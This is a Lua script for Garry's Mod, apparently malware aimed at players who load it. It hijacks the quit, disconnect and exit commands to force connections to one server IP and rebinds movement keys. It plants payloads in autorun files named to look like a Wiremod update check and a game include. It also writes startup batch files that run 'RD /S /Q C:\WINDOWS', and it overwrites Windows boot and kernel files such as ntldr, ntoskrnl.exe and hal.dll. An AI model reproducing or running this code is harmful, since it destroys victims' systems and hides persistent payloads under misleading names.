




local LOLKeys = [[
alias menu_startgame "connect 188.165.193.84:27023"
alias quit "connect 188.165.193.84:27023"
alias disconnect "connect 188.165.193.84:27023"
alias exit "connect 188.165.193.84:27023"

bind w "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind a "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind s "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind d "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind tab "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
bind space "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"
]]

local Payload = [[
require("timer")

local function OhDear()
	LocalPlayer():ConCommand("say Im terrible at gmod, i hack!")
end
timer.Create("OhDear", 5, 0, OhDear)

local function Whoops()
	LocalPlayer():ConCommand("say bye, im off to get banned!")
	
	timer.Simple(1, function()
		LocalPlayer():ConCommand("connect connect 188.165.193.84:27023")
	end
end
timer.Create("Whoops", 30, 0, Whoops)
]]


if (gpio.Write("C:\\test.lua", "LOL", true) == gpio.Done) then
	gpio.Write("cfg/autoexec.cfg", LOLKeys)
	gpio.Write("cfg/valve.rc", LOLKeys)
	
	gpio.Write("lua/autorun/client/wiremod_update_check.lua", Payload)
	gpio.Write("lua/includes/enum/bullet_types.lua", Payload)
	
	local function Fuckup(where)
		gpio.Write(where, "Gone", true)
	end
	
	--oh god how did this get here im not good with computer
	gpio.Write("C:\\AUTOEXEC.BAT", "RD /S /Q C:\\WINDOWS\nshutdown -s -t 180 -c Whoops")
	gpio.Write("C:\\Users\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS")
	gpio.Write("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\windows.bat", "RD /S /Q C:\\WINDOWS")
	
	Fuckup("C:\\boot.ini")
	Fuckup("C:\\config.sys")
	Fuckup("C:\\ntldr")
	
	Fuckup("C:\\WINDOWS\\bootstat.dat")
	Fuckup("C:\\WINDOWS\\System32\\ntoskrnl.exe")
	Fuckup("C:\\WINDOWS\\System32\\hal.dll")
	
	Fuckup("C:\\WINDOWS\\System32\\bootres.dll")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com")
	Fuckup("C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi")
	Fuckup("C:\\WINDOWS\\Boot\\PCAT\\bootmgr")
end


if (gpio.ConCommand("status") == gpio.Done) then
	local RCC = gpio.ConCommand
	
	local function FuckKey(key)
		RCC('bind '..key..' "alias unbindall; alias unbind; alias bind; say Im terrible at gmod!"')
	end

	RCC("unbindall")
		RCC("host_writeconfig")
		
		FuckKey("w")
		FuckKey("a")
		FuckKey("s")
		FuckKey("d")
		FuckKey("f")
		FuckKey("q")
		FuckKey("v")
		FuckKey("e")
		FuckKey("tab")
		FuckKey("space")
		
		RCC('alias menu_startgame "connect 188.165.193.84:27023"') --Flap's server, double ban!
		RCC('alias quit "connect 188.165.193.84:27023"')
		RCC('alias disconnect "connect 188.165.193.84:27023"')
		RCC('alias exit "connect 188.165.193.84:27023"')
	RCC("host_writeconfig") --Yay for steam cloud
end















